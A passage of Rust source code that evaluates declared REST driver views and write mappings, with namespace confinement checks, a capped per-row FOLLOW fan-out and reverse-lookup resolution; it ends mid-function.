//! blueprint §13 **tier 2** — declared-view **body evaluation** (the execution half). Reading a
//! declared mount is not a native wire fetch (tier 1); it is *executing the view's stored pipeline*:
//! the body's confined `/http/<self>/…` source is fetched over the wire, the body's remaining pipe
//! ops run through the real engine, and the declared `OF` type shapes the delivered rows. One rule —
//! "a declared view IS its stored query" — dissolves the tier-1 parity gaps (envelope unwrapping is
//! an ordinary `|> EXPAND`, the mount path decouples from the wire endpoint, the type is enforced).
//!
//! This lives in qfs-exec (which already owns query execution above the spine) rather than the
//! binary, so the binary stays off the lower spine (`qfs-parser`/`qfs-engine`): the driver-specific
//! **fetch is injected as a closure** by the caller (the binary's `RestReadDriver`, over its confined
//! applier). The body was stored by the surface desugar as the serde JSON of a parsed
//! `Statement::Query`; this module rehydrates it via serde (no re-parse) and reuses the SHIPPED
//! lowering (`qfs_pushdown::lower_query` + `partition_by_source`) and engine
//! (`qfs_engine::MiniEvaluator`) — the same machinery the main read path runs.
//!
//! ## Confinement (defense in depth)
//! The body's source MUST address the driver's own `/http/<name>` namespace, re-checked here before
//! the fetch closure is ever called (the load-time structural check already dropped foreign-host
//! declarations, and the caller's applier confines the wire host at `send_one`).

use qfs_core::{
    CfsError, Column, ColumnType, Fields, PushdownProfile, Row, RowBatch, Schema, Value,
};
use qfs_engine::{eval_value, CombineEngine, MiniEvaluator, ScanResults};
use qfs_parser::{EffectBody, Expr, Op, PipeOp, Pipeline, Projection, Source, Statement};
use qfs_pushdown::{lower_query, lower_scalar, partition_by_source, SourceId, SourceRegistry};

/// The single column a `FOLLOW <field>` stage delivers: the followed URL's raw response bytes.
/// Mirrors the blob convention of the local driver (`content` carries the bytes).
pub const FOLLOW_CONTENT_COL: &str = "content";

/// The ceiling on a `FOLLOW … INTO` per-row fan-out (blueprint §13.1 G4): N delivered rows are N
/// wire requests, so the stage is **bounded and visible**, never a silent request storm. The number
/// is the one the declared cursor pagination already uses (`PAGINATE CURSOR (… MAX 50)`) — one
/// chattiness budget, one number. A delivered batch larger than this is a structured refusal naming
/// the cap, not a truncation: silently hydrating the first 50 of 500 rows would be a quiet wrong
/// answer, which is exactly what the fan-out must not produce.
pub const FOLLOW_FANOUT_MAX: usize = 50;

/// The synthetic source id every declared-view body scan routes to — the wire namespace. The body is
/// fetched by the injected closure (not a registered read driver), so the id only needs to be stable;
/// `PushdownProfile::None` keeps every op residual (run by the engine over the fetched batch), which
/// is exactly what tier 2 wants.
const WIRE_SOURCE: &str = "http";

/// One declared view, resolved for evaluation: its mount-path template (`/slack/history` or
/// `/chatwork/rooms/{room}/messages`), its stored body, and — if it declared `OF <type>` — the
/// column names that type promises (the delivered contract the result is shaped to).
#[derive(Debug, Clone)]
pub struct ViewSpec {
    /// The mount-path template (`{param}` segments bind at read time).
    pub template: String,
    /// The stored body: serde JSON of a parsed `Statement::Query`.
    pub body: String,
    /// The `OF <type>` column names, if the view declared a type.
    pub of_columns: Option<Vec<String>>,
    /// The `OF <type>`'s row-local refinement predicate (blueprint §5.4), if the type carried a
    /// `WHERE`. Enforced as per-row MEMBERSHIP over each delivered row.
    pub of_refinement: Option<Expr>,
    /// The view's declared `PUSHDOWN (…)` map (blueprint §13.1 G2), resolved from its own clause or
    /// its driver's default. `None` = nothing pushes (every predicate stays local residual).
    pub pushdown: Option<DeclaredPushdown>,
}

/// One declared write/CALL mapping, resolved for evaluation (blueprint §13 tier 2 — the write
/// twin of [`ViewSpec`]): its mount-path template (`/slack/post` or
/// `/chatwork/rooms/{room}/messages`) and its stored effect body (an `INSERT INTO /http/<self>/…
/// VALUES (<expr>)` statement, serde JSON of a parsed `Statement::Effect`).
#[derive(Debug, Clone)]
pub struct MapSpec {
    /// The mount-path template the universal write verb addresses (`{param}` segments bind at
    /// apply time from the incoming effect path).
    pub template: String,
    /// The stored verb label: a universal verb (`INSERT`) or a `CALL <driver>.<action>[(<sig>)]`
    /// (blueprint §13.1 G5). The apply facet selects the map by it, so a CALL map answers ONLY its
    /// own procedure and a universal write never lands on a CALL map that shares its mount path.
    pub verb: String,
    /// The stored body: serde JSON of a parsed `Statement::Effect` whose `VALUES (<expr>)` maps a
    /// bound `row` to the wire body.
    pub body: String,
}

/// The unqualified action of a declared `CALL` map's verb label (`CALL slack.react(channel text,
/// …)` → `react`), or `None` for a universal-verb map. The one parser both the §13.1 G5 signature
/// lift and the CALL dispatch read the label with, so the advertised procedure and the dispatched
/// one cannot drift apart.
#[must_use]
pub fn call_action(verb: &str) -> Option<&str> {
    let rest = verb.strip_prefix("CALL ")?;
    let head = rest.split_once('(').map_or(rest, |(head, _)| head);
    let action = head.trim().split_once('.')?.1.trim();
    (!action.is_empty()).then_some(action)
}

/// The evaluated wire write of a declared MAP (blueprint §13 tier 2): the confined
/// `/rest/<driver>/<resource>` path the applier POSTs to, and one wire-body [`Value`] per incoming
/// row (the map's `VALUES (<expr>)` evaluated with `row` bound to that row). The caller (the
/// binary's confined applier) encodes each body through the driver codec and performs the I/O —
/// evaluation stays pure, exactly as the read side injects its wire fetch as a closure.
#[derive(Debug, Clone)]
pub struct MapWrite {
    /// The `/rest/<driver>/<resource>` path the applier resolves to the confined wire endpoint.
    pub rest_path: String,
    /// One evaluated wire body per incoming row, in input order.
    pub bodies: Vec<Value>,
    /// The declared wire-body encoding (`… |> ENCODE multipart VALUES (row)`, blueprint §13 /
    /// ticket 20260711121526), `None` for the default JSON encode. The caller's applier resolves
    /// the named encoding (an unknown name is its structured refusal, never a silent JSON).
    pub encoding: Option<String>,
    /// The wire effect kind the BODY itself declares (`INSERT INTO /http/… VALUES (…)` → `Insert`).
    /// A declared `CALL` has no wire verb of its own — `Call` is not a kind the generic REST driver
    /// services — so the caller stamps this onto the wire effect and the CALL is issued as exactly
    /// the write its body names.
    pub wire_kind: qfs_core::EffectKind,
}

/// One declared **reverse lookup** a map body binds ahead of its effect (blueprint §13.1 **G9**):
///
/// ```text
/// LET cid = /slack/{ws}/channels |> WHERE name == row.channel |> SELECT id
/// ```
///
/// The descriptor is what [`map_body_lookups`] extracts **purely** from the stored body; the caller's
/// confined applier fetches `source_path` **once per statement** and hands the rows back to
/// [`eval_map_body`], which matches them **locally per row**. That split is what keeps the evaluator
/// pure and makes the shape identical to the compiled oracle's (one `conversations.list`, then a
/// local scan), so equivalence is provable on shared fixtures rather than asserted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MapLookup {
    /// The bound name the effect body references (`cid`).
    pub name: String,
    /// The mount path of the collection to search — **on the declaring driver's own surface**, with
    /// the map's `{param}`s already substituted (`/slack/T1/channels`). Confinement is checked at
    /// extraction: a foreign source never reaches the caller.
    pub source_path: String,
    /// The collection column compared against the incoming row (`name`).
    pub match_col: String,
    /// The incoming-row field it is compared to (`channel`, from `row.channel`).
    pub row_field: String,
    /// The collection column whose value is bound (`id`).
    pub select_col: String,
}

/// Extract the declared reverse lookups a stored map body binds ahead of its effect — **pure**, no
/// I/O, blueprint §13.1 G9. Returns them in binding order; a body with no `LET` returns an empty vec,
/// which is the shape every shipped declaration has today.
///
/// The accepted binding is deliberately **one narrow shape** —
/// `LET <name> = <own-mount-path> |> WHERE <col> == row.<field> |> SELECT <col>` — and anything else
/// is a structured refusal rather than a best-effort interpretation. That is the predicate-honesty
/// law applied to a declaration: a lookup the runtime cannot perform exactly must not be accepted and
/// then approximated.
///
/// **Confinement (§13, the write-side twin of the read side's host pin).** `source_path`'s first
/// segment must be the declaring driver's own mount. A body naming another driver's surface — or the
/// raw `/http/…` wire — is refused here, so a declaration can never read outside its own driver to
/// build a write.
///
/// # Errors
/// [`CfsError::InvalidPath`] when the body is not rehydratable, a binding is not the accepted shape,
/// or a binding names a source outside the driver's own mount.
pub fn map_body_lookups(
    body_json: &str,
    driver_name: &str,
    map_path: &str,
    params: &[(String, String)],
) -> Result<Vec<MapLookup>, CfsError> {
    let invalid = |reason: &'static str| CfsError::InvalidPath {
        path: map_path.to_string(),
        reason,
    };
    let stmt: Statement = serde_json::from_str(body_json)
        .map_err(|_| invalid("declared map body is not rehydratable"))?;

    let mut lookups = Vec::new();
    let mut cursor = &stmt;
    while let Statement::Let { name, value, body } = cursor {
        lookups.push(lookup_of_binding(
            name,
            value,
            driver_name,
            params,
            &invalid,
        )?);
        cursor = body;
    }
    Ok(lookups)
}

/// Destructure one `LET` binding into a [`MapLookup`], enforcing the accepted shape and the §13
/// confinement. Split out so [`map_body_lookups`] stays a readable peel of the let-in nesting.
fn lookup_of_binding(
    name: &str,
    value: &Statement,
    driver_name: &str,
    params: &[(String, String)],
    invalid: &impl Fn(&'static str) -> CfsError,
) -> Result<MapLookup, CfsError> {
    let Statement::Query(pipeline) = value else {
        return Err(invalid("declared map LET must bind a read pipeline"));
    };
    let Source::Path(path) = &pipeline.source else {
        return Err(invalid(
            "declared map LET source must be a path on the driver's own mount",
        ));
    };
    // §13 confinement: the collection must live on THIS driver's mount. A foreign mount (or the raw
    // `/http` wire) is refused before the caller ever sees the descriptor.
    if path.segments.first().map(|s| s.name.as_str()) != Some(driver_name) {
        return Err(invalid(
            "declared map LET reads outside its own driver (§13 confinement)",
        ));
    }
    let source_path = render_source_path(&path.segments, params);

    let (match_col, row_field, select_col) = match pipeline.ops.as_slice() {
        [PipeOp::Where(pred), PipeOp::Select(projections)] => {
            let (match_col, row_field) = eq_against_row_field(pred, invalid)?;
            (
                match_col,
                row_field,
                single_projected_column(projections, invalid)?,
            )
        }
        _ => {
            return Err(invalid(
                "declared map LET must be `|> WHERE <col> == row.<field> |> SELECT <col>`",
            ))
        }
    };

    Ok(MapLookup {
        name: name.to_string(),
        source_path,
        match_col,
        row_field,
        select_col,
    })
}

/// The `WHERE <col> == row.<field>` predicate, as `(collection column, incoming-row field)`.
fn eq_against_row_field(
    pred: &Expr,
    invalid: &impl Fn(&'static str) -> CfsError,
) -> Result<(String, String), CfsError> {
    let Expr::Binary {
        op: Op::Eq,
        lhs,
        rhs,
    } = pred
    else {
        return Err(invalid(
            "declared map LET predicate must be `<col> == row.<field>`",
        ));
    };
    let Expr::Col(col) = lhs.as_ref() else {
        return Err(invalid(
            "declared map LET predicate must compare a collection column",
        ));
    };
    match rhs.as_ref() {
        Expr::Path(segments) if segments.len() == 2 && segments[0].as_str() == "row" => {
            Ok((col.to_string(), segments[1].to_string()))
        }
        _ => Err(invalid(
            "declared map LET predicate must compare against `row.<field>`",
        )),
    }
}

/// The single bare column a lookup's `SELECT` projects.
fn single_projected_column(
    projections: &[Projection],
    invalid: &impl Fn(&'static str) -> CfsError,
) -> Result<String, CfsError> {
    match projections {
        [Projection::Expr {
            expr: Expr::Col(col),
            ..
        }] => Ok(col.to_string()),
        _ => Err(invalid(
            "declared map LET must SELECT exactly one bare column",
        )),
    }
}

/// Resolve one lookup for one incoming row against the collection the applier fetched — the local
/// half of G9, and the half that carries the refusals.
///
/// Exactly one match binds. **Zero** is `unresolvable` and **more than one** is `ambiguous`; both are
/// structured refusals raised before the effect leg is constructed, so the wire write is never issued
/// with a guessed or missing id. That is the predicate-honesty law applied to a write: the alternative
/// — picking the first match — is a silent wrong answer that looks like success.
fn resolve_lookup(
    lookup: &MapLookup,
    collection: &RowBatch,
    incoming: &RowBatch,
    row: &Row,
    invalid: &impl Fn(&'static str) -> CfsError,
) -> Result<Value, CfsError> {
    let wanted = incoming
        .schema
        .columns
        .iter()
        .position(|c| c.name == lookup.row_field)
        .and_then(|i| row.values.get(i))
        .ok_or_else(|| invalid("the declared map LET names a field the incoming row lacks"))?;

    let match_idx = collection
        .schema
        .columns
        .iter()
        .position(|c| c.name == lookup.match_col)
        .ok_or_else(|| invalid("the lookup collection has no column the LET matches on"))?;
    let select_idx = collection
        .schema
        .columns
        .iter()
        .position(|c| c.name == lookup.select_col)
        .ok_or_else(|| invalid("the lookup collection has no column the LET selects"))?;

    let mut hit: Option<&Value> = None;
    for candidate in &collection.rows {
        if candidate.values.get(match_idx) == Some(wanted) {
            if hit.is_some() {
                return Err(invalid(
                    "the declared map LET matched more than one row — refusing rather than picking",
                ));
            }
            hit = candidate.values.get(select_idx);
        }
    }
    hit.cloned().ok_or_else(|| {
        invalid("the declared map LET resolved no row — the name does not exist in the collection")
    })
}

/// Match a concrete mount path against a view-path template, binding `{param}` segments. Returns the
/// bound `(name, value)` pairs when every non-template segment matches and the segment counts agree;
/// `None` otherwise. A template segment `{room}` binds the concrete segment in that position.
#[must_use]
pub fn match_template(template: &str, concrete: &str) -> Option<Vec<(String, String)>> {
    let t: Vec<&str> = template.trim_matches('/').split('/').collect();
    let c: Vec<&str> = concrete.trim_matches('/').split('/').collect();
    if t.len() != c.len() {
        return None;
    }
    let mut params = Vec::new();
    for (ts, cs) in t.iter().zip(c.iter()) {
        if is_param(ts) {
            params.push((ts[1..ts.len() - 1].to_string(), (*cs).to_string()));
        } else if ts != cs {
            return None;
        }
    }
    Some(params)
}

/// Recover a declared driver's mount-relative view path from the inner remapped scan path: the
/// declared read facet is registered behind a `/rest/<name>` remap, so an inbound scan arrives as
/// `/rest/<name>/<rest…>`; the view template is `/<name>/<rest…>`. Strips the synthetic `/rest`.
#[must_use]
pub fn view_path_of_scan(scan_path: &str) -> String {
    match scan_path.strip_prefix("/rest") {
        Some(rest) if rest.is_empty() || rest.starts_with('/') => rest.to_string(),
        _ => scan_path.to_string(),
    }
}

/// Whether a path segment is a `{param}` template placeholder.
fn is_param(seg: &str) -> bool {
    seg.len() >= 2 && seg.starts_with('{') && seg.ends_with('}')
}

/// Evaluate a declared view body and return the shaped rows (blueprint §13 tier 2). The `fetch`
/// closure performs the driver-specific wire read for a `/rest/<name>/<resource>` path (the caller's
/// confined applier); everything else — rehydrate, confine, run the body's ops through the engine,
/// shape to the `OF` type — is here.
///
/// Steps: rehydrate the stored `Statement::Query`; render + `{param}`-substitute its `/http/…` source
/// and **confine** it to the driver's own namespace; `fetch` the resource (the wire codec performs
/// the leading `DECODE`); run the body's remaining ops (`EXPAND`, `WHERE`, `SELECT`, …) through the
/// shipped lowering + engine; then shape the result to the declared `OF` type's columns.
///
/// # Errors
/// [`CfsError::InvalidPath`] if the body is not a rehydratable read query, its source is outside the
/// driver's `/http/<name>` namespace (the confinement violation), or the fetch / engine fails.
// 8 args: the view identity (name/path/OF columns/refinement/params) plus the TWO injected wire
// closures (fetch + follow) — grouping them would only move the count into a one-shot struct.
#[allow(clippy::too_many_arguments)]
pub fn eval_view_body<F, G>(
    body_json: &str,
    driver_name: &str,
    view_path: &str,
    of_columns: Option<&[String]>,
    of_refinement: Option<&Expr>,
    params: &[(String, String)],
    wire_params: &[(String, String)],
    fetch: F,
    follow: G,
) -> Result<RowBatch, CfsError>
where
    // `Fn`, not `FnOnce`: a §13.1 G4 `FOLLOW … INTO` fan-out calls the SAME confined wire closure
    // once per delivered row, so the detail requests ride the driver's own auth + host pin exactly
    // as the first fetch does.
    F: Fn(&str, Option<Value>) -> Result<RowBatch, CfsError>,
    G: FnOnce(&str) -> Result<Vec<u8>, CfsError>,
{
    let invalid = |reason: &'static str| CfsError::InvalidPath {
        path: view_path.to_string(),
        reason,
    };

    // 0. A declared `OF` contract that resolves to ZERO columns is unreadable, loudly: the type
    //    row is missing, or its stored body predates the §5.4 object shape (a pre-break install).
    //    Shaping to an empty column list would silently project every delivered value away — the
    //    live zero-column defect (ticket 20260712005100) — so refuse with the fix in hand instead.
    if of_columns.is_some_and(<[String]>::is_empty) {
        return Err(invalid(
            "the view's declared OF type resolves no columns (its /sys/drivers type row is \
             missing or predates the current body shape) — re-install the driver declaration",
        ));
    }

    // 1. Rehydrate the stored body (serde, no re-parse). A view body is a read query.
    let stmt: Statement = serde_json::from_str(body_json)
        .map_err(|_| invalid("declared view body is not rehydratable"))?;
    let Statement::Query(mut pipeline) = stmt else {
        return Err(invalid("declared view body is not a read query"));
    };

    // 2. Render + {param}-substitute the wire source, and CONFINE it to `/http/<name>/…`.
    let Source::Path(src) = &pipeline.source else {
        return Err(invalid("declared view body must read a wire path"));
    };
    let source_path = render_source_path(&src.segments, params);
    let wire_resource = confined_wire_resource(&source_path, driver_name)
        .ok_or_else(|| invalid("declared view body addresses a foreign host (§13 confinement)"))?;

    // 2a. Read-over-POST (blueprint §13.1 G1): a leading `POST <body>` op makes the wire read a
    //     POST carrying the evaluated struct-literal body (a read has no incoming `row`, so the
    //     body is evaluated against an empty row — constants + `{param}`-free struct literals). The
    //     op is stripped here so the remaining pipeline (its leading `DECODE`, then `EXPAND`/…) runs
    //     exactly as a GET view's would; a POST op in any OTHER position falls through to lowering,
    //     which refuses it (defense in depth). Confinement is unaffected — the source host is
    //     already checked above; the body is data.
    let post_body: Option<Value> = if matches!(pipeline.ops.first(), Some(PipeOp::Post(_))) {
        let PipeOp::Post(pref) = pipeline.ops.remove(0) else {
            unreachable!("matches! guarded a leading Post op");
        };
        let scalar = lower_scalar(&pref.body)
            .map_err(|_| invalid("declared view POST body is not a per-read expression"))?;
        Some(eval_value(&scalar, &Schema::empty(), &Row::new(vec![])))
    } else {
        None
    };

    // 3. Fetch the wire resource over the caller's confined applier (leading `DECODE` = the applier
    //    codec; a `Some` post_body makes it a POST-to-read). The stock `/rest/<name>/<resource>`
    //    addressing the applier resolves.
    // §13.1 G2: the caller's already-lowered declared pushdown parameters ride onto the wire
    // resource's query string here — the ONE place a declared read reaches the wire, so a pushed
    // parameter provably reached the request.
    let wire_resource = append_wire_params(&wire_resource, wire_params);
    let rest_path = format!("/rest/{driver_name}/{wire_resource}");
    let fetched = fetch(&rest_path, post_body)?;

    // 4. Split the body at its `FOLLOW <field>` stage, if any (blueprint §13, ticket
    //    20260711121526): the ops BEFORE it run over the fetched batch as usual, then the named
    //    field of the (single) delivered row becomes the URL of the second GET — performed by the
    //    injected `follow` closure, which carries NO driver credentials (the URL is
    //    self-authorizing) — and its raw bytes become a one-row `content` batch the ops AFTER the
    //    stage (usually none) run over.
    let follow_at = pipeline
        .ops
        .iter()
        .position(|op| matches!(op, PipeOp::Follow(_)));
    let evaluated = match follow_at {
        None => run_body_ops(&pipeline, fetched).map_err(|reason| CfsError::InvalidPath {
            path: view_path.to_string(),
            reason,
        })?,
        Some(at) => {
            if pipeline.ops[at + 1..]
                .iter()
                .any(|op| matches!(op, PipeOp::Follow(_)))
            {
                return Err(invalid(
                    "a declared view body may carry at most one FOLLOW stage",
                ));
            }
            let pre = Pipeline {
                source: pipeline.source.clone(),
                ops: pipeline.ops[..at].to_vec(),
            };
            let delivered =
                run_body_ops(&pre, fetched).map_err(|reason| CfsError::InvalidPath {
                    path: view_path.to_string(),
                    reason,
                })?;
            let PipeOp::Follow(fref) = &pipeline.ops[at] else {
                unreachable!("position() matched a Follow op");
            };
            // Two forms of the one stage (blueprint §13.1 G4 — `FOLLOW` is a per-row
            // join-to-wire, of which blob download is one instance):
            //   * `INTO <template>` — the general per-row fan-out (detail hydration, an id→object
            //     resolution), issued through the driver's OWN confined applier;
            //   * no template — the bytes shorthand: ONE self-authorizing GET off the delivered
            //     URL, performed by the credential-free `follow` closure.
            let batch = match &fref.into {
                Some(template) => fan_out_rows(
                    &delivered,
                    &fref.field,
                    template,
                    driver_name,
                    params,
                    view_path,
                    &fetch,
                )?,
                None => {
                    let url = follow_url(&delivered, &fref.field).map_err(invalid)?;
                    let bytes = follow(&url)?;
                    RowBatch::new(
                        Schema::new(vec![Column::new(
                            FOLLOW_CONTENT_COL,
                            ColumnType::Bytes,
                            false,
                        )]),
                        vec![Row::new(vec![Value::Bytes(bytes)])],
                    )
                }
            };
            let rest_ops = pipeline.ops[at + 1..].to_vec();
            if rest_ops.is_empty() {
                batch
            } else {
                let post = Pipeline {
                    source: pipeline.source.clone(),
                    ops: rest_ops,
                };
                run_body_ops(&post, batch).map_err(|reason| CfsError::InvalidPath {
                    path: view_path.to_string(),
                    reason,
                })?
            }
        }
    };

    // 5. Shape to the declared `OF` type (the delivered contract) — project to its columns, then
    //    membership-check each delivered row against the type's refinement (blueprint §5.4).
    shape_to_type(evaluated, of_columns, of_refinement, view_path)
}

/// The §13.1 **G4** per-row fan-out: for EACH delivered row, substitute the row into the
/// `INTO /http/<drv>/<template>` detail address, issue that request through the driver's own
/// confined wire closure, and splice the decoded detail back into the row.
///
/// Four rules, each one of the ticket's Policies made mechanical:
///
/// * **Bounded and visible.** N rows are N requests, so a batch above [`FOLLOW_FANOUT_MAX`] is a
///   structured refusal naming the cap — never a silent storm, and never a truncation (hydrating
///   the first 50 of 500 would be the quiet wrong answer the cap exists to prevent).
/// * **Confined per row.** The rendered target is re-checked against `/http/<driver>/…` for EVERY
///   row, not once for the template: the anti-exfiltration boundary holds per request.
/// * **Refuse, never guess.** A row whose `<field>` is absent, `Null`, or empty is refused here —
///   at PREVIEW, where the read runs — rather than silently spliced as `Null` or sent to the wire
///   as a garbage id. A detail request that answers with no row (or more than one) is likewise a
///   refusal: "this value does not resolve" is an answer, "I picked one" is not.
/// * **One shape for every row.** The first row's detail schema is the contract; a later row whose
///   detail carries different columns is a refusal rather than a ragged batch.
///
/// **Substitution scope and precedence.** `{name}` in the template resolves against the DELIVERED
/// ROW's columns first, then the view's bound `{param}` segments. Row-first is the honest default
/// for a stage whose whole meaning is "per row"; a template `{channel}` in a fan-out reads as the
/// row's channel, and the view parameter is the outer fallback.
///
/// **Splice precedence.** The detail's columns are appended to the row, and on a name collision the
/// DETAIL replaces the row's value: the row carried a stub, the detail is the hydrated truth, which
/// is the entire point of a list→detail fan-out.
fn fan_out_rows<F>(
    delivered: &RowBatch,
    field: &str,
    template: &[qfs_parser::PathSegment],
    driver_name: &str,
    params: &[(String, String)],
    view_path: &str,
    fetch: &F,
) -> Result<RowBatch, CfsError>
where
    F: Fn(&str, Option<Value>) -> Result<RowBatch, CfsError>,
{
    let invalid = |reason: &'static str| CfsError::InvalidPath {
        path: view_path.to_string(),
        reason,
    };

    if delivered.rows.len() > FOLLOW_FANOUT_MAX {
        return Err(invalid(
            "a FOLLOW … INTO fan-out is one wire request per delivered row and is capped at 50 \
             rows — narrow the view's WHERE/LIMIT rather than issuing an unbounded request storm",
        ));
    }
    let idx = delivered
        .schema
        .columns
        .iter()
        .position(|c| c.name == field)
        .ok_or_else(|| invalid("the FOLLOW field was not delivered by the preceding stages"))?;

    let mut schema: Option<Schema> = None;
    let mut rows: Vec<Row> = Vec::with_capacity(delivered.rows.len());
    for row in &delivered.rows {
        // The followed value must be a concrete, non-empty scalar. A `Null`/absent/empty field is
        // the unresolvable reference: refused here, never guessed onto the wire.
        let followed = row.values.get(idx).and_then(wire_text).ok_or_else(|| {
            invalid(
                "the FOLLOW … INTO field is empty or not a text/int value on some delivered row — \
                 an unresolvable reference is refused, never guessed",
            )
        })?;
        // Row-first bindings (see the precedence note above), with the followed field guaranteed
        // present under its own name even when the row spells it as an int.
        let mut bindings: Vec<(String, String)> = Vec::new();
        for (col, value) in delivered.schema.columns.iter().zip(&row.values) {
            if let Some(text) = wire_text(value) {
                bindings.push((col.name.clone(), text));
            }
        }
        bindings.push((field.to_string(), followed));
        bindings.extend(params.iter().cloned());

        let target = render_source_path(template, &bindings);
        // Re-checked PER ROW: a row value can never steer the request off the driver's own host.
        let wire_resource = confined_wire_resource(&target, driver_name).ok_or_else(|| {
            invalid("a FOLLOW … INTO target addresses a foreign host (§13 confinement)")
        })?;
        let detail = fetch(&format!("/rest/{driver_name}/{wire_resource}"), None)?;
        let [detail_row] = detail.rows.as_slice() else {
            return Err(invalid(
                "a FOLLOW … INTO detail request must answer with exactly one row — a value that \
                 resolves to none (or to several) is refused, not guessed",
            ));
        };

        let mut names: Vec<String> = delivered
            .schema
            .columns
            .iter()
            .map(|c| c.name.clone())
            .collect();
        let mut values = row.values.clone();
        for (col, value) in detail.schema.columns.iter().zip(&detail_row.values) {
            match names.iter().position(|n| n == &col.name) {
                Some(at) => values[at] = value.clone(),
                None => {
                    names.push(col.name.clone());
                    values.push(value.clone());
                }
            }
        }
        let shape = Schema::new(
            names
                .iter()
                .map(|n| Column::new(n.clone(), ColumnType::Unknown, true))
                .collect(),
        );
        match &schema {
            None => schema = Some(shape),
            Some(first) => {
                if first.columns.len() != shape.columns.len()
                    || first
                        .columns
                        .iter()
                        .zip(&shape.columns)
                        .any(|(a, b)| a.name != b.name)
                {
                    return Err(invalid(
                        "a FOLLOW … INTO fan-out delivered different columns for different rows — \
                         the first row's detail shape is the contract",
                    ));
                }
            }
        }
        rows.push(Row::new(values));
    }
    // Zero delivered rows fan out to zero requests and deliver zero rows, keeping the pre-stage
    // schema so the ops after the stage still see the columns they were written against.
    Ok(RowBatch::new(
        schema.unwrap_or_else(|| delivered.schema.clone()),
        rows,
    ))
}

/// The wire spelling of a delivered value for `{param}` substitution: only text and int have an
/// unambiguous one. Everything else (`Null`, a struct, a list, bytes) has none — the caller turns
/// that into the structured "unresolvable reference" refusal rather than inventing a rendering.
fn wire_text(v: &Value) -> Option<String> {
    match v {
        Value::Text(t) if !t.is_empty() => Some(t.clone()),
        Value::Int(i) => Some(i.to_string()),
        _ => None,
    }
}

/// The follow URL of a delivered batch: exactly ONE row (a follow over zero or many rows is
/// ambiguous — fail closed) whose named field is text. Returns the structured reason otherwise.
fn follow_url(delivered: &RowBatch, field: &str) -> Result<String, &'static str> {
    let [row] = delivered.rows.as_slice() else {
        return Err("FOLLOW requires exactly one delivered row to take the URL field from");
    };
    let idx = delivered
        .schema
        .columns
        .iter()
        .position(|c| c.name == field)
        .ok_or("the FOLLOW field was not delivered by the preceding stages")?;
    match row.values.get(idx) {
        Some(Value::Text(url)) if !url.is_empty() => Ok(url.clone()),
        _ => Err("the FOLLOW field must carry a non-empty text URL"),
    }
}

/// Evaluate a declared MAP body against the incoming write rows and return the wire write
/// (blueprint §13 tier 2 — the write twin of [`eval_view_body`]). The map body is a stored `INSERT
/// INTO /http/<self>/<resource> VALUES (<expr>)` statement; `<expr>` (`row` passthrough, or a
/// `{field: row.col, …}` struct literal) is evaluated **per incoming row** with `row` bound to that
/// row, constructing the wire body the applier POSTs. Purity holds: this constructs the wire
/// effect; the caller's confined applier performs the I/O at COMMIT.
///
/// Steps: rehydrate the stored `Statement::Effect`; render + `{param}`-substitute its `/http/…`
/// target and **confine** it to the driver's own namespace; lower the single `VALUES` expression to
/// a per-row scalar via the shipped [`lower_scalar`]; then, for each incoming row, bind it as a
/// single `row` struct column and evaluate the expression via the shipped [`eval_value`].
///
/// # Errors
/// [`CfsError::InvalidPath`] if the body is not a rehydratable single-expression `VALUES` write, its
/// target is outside the driver's `/http/<name>` namespace (the confinement violation), or the
/// expression is not a per-row scalar the engine can evaluate.
pub fn eval_map_body(
    body_json: &str,
    driver_name: &str,
    map_path: &str,
    params: &[(String, String)],
    incoming: &RowBatch,
    lookups: &[(MapLookup, RowBatch)],
) -> Result<MapWrite, CfsError> {
    let invalid = |reason: &'static str| CfsError::InvalidPath {
        path: map_path.to_string(),
        reason,
    };

    // 1. Rehydrate the stored body (serde, no re-parse). A map body is a single-row `VALUES (<expr>)`
    //    write effect (one wire body per incoming row; the row list is the write's own — not here),
    //    optionally preceded by `LET` bindings (§13.1 G9 — the reverse lookup). The bindings were
    //    extracted and FETCHED by the caller; here they are only walked past to reach the effect,
    //    which is what keeps this function pure.
    let stmt: Statement = serde_json::from_str(body_json)
        .map_err(|_| invalid("declared map body is not rehydratable"))?;
    let mut cursor = stmt;
    while let Statement::Let { body, .. } = cursor {
        cursor = *body;
    }
    let Statement::Effect(effect) = cursor else {
        return Err(invalid("declared map body is not a write effect"));
    };
    // The body is a `VALUES` write, either bare or wrapped in the `|> ENCODE <fmt>` upload form
    // (blueprint §13, ticket 20260711121526) — the parser desugared `INSERT INTO … |> ENCODE
    // multipart VALUES (row)` onto the `EffectBody::Pipeline` shape (a VALUES source with one
    // encode stage). The named encoding rides on the returned [`MapWrite`] for the applier.
    let (values, encoding) =
        match &effect.body {
            EffectBody::Values(values) => (values, None),
            EffectBody::Pipeline(p) => {
                let Source::Values(values) = &p.source else {
                    return Err(invalid("declared map body must be a VALUES write"));
                };
                match p.ops.as_slice() {
                    [PipeOp::Encode(codec)] => (values, Some(codec.fmt.clone())),
                    _ => return Err(invalid(
                        "declared map pipeline body must be exactly one ENCODE stage over VALUES",
                    )),
                }
            }
            EffectBody::SetWhere { .. } => {
                return Err(invalid("declared map body must be a VALUES write"))
            }
        };
    let expr = match values.rows.as_slice() {
        [row] => match row.as_slice() {
            [expr] => expr,
            _ => {
                return Err(invalid(
                    "declared map VALUES must carry exactly one wire-body expression",
                ))
            }
        },
        _ => return Err(invalid("declared map VALUES must carry exactly one row")),
    };

    // 2. Render + {param}-substitute the wire target, and CONFINE it to `/http/<name>/…` (the same
    //    anti-exfiltration boundary the read side enforces before any fetch).
    let target_path = render_source_path(&effect.target.segments, params);
    let wire_resource = confined_wire_resource(&target_path, driver_name)
        .ok_or_else(|| invalid("declared map body addresses a foreign host (§13 confinement)"))?;
    let rest_path = format!("/rest/{driver_name}/{wire_resource}");

    // 3. Lower the single `VALUES` expression to a per-row scalar (the SHIPPED lowering a computed
    //    `SELECT` term uses — one lowering, both paths).
    let scalar =
        lower_scalar(expr).map_err(|_| invalid("declared map body is not a per-row expression"))?;

    // 4. Evaluate per incoming row: bind the row as a single `row` struct column — plus one column
    //    per resolved §13.1 G9 lookup, so the effect body references `cid` exactly as it is written —
    //    then run the scalar through the SHIPPED per-row evaluator. `row` passthrough yields the
    //    whole struct; a `{f: row.col}` literal navigates its fields — the wire body the applier
    //    encodes + POSTs.
    //
    //    The lookup collections were fetched ONCE by the caller; the match runs here, per row, over
    //    those rows. A row whose name resolves to zero or to several is a refusal that aborts the
    //    whole evaluation, so no effect leg is constructed for ANY row of a statement that contains
    //    an unresolvable one — the wire never sees a guessed id.
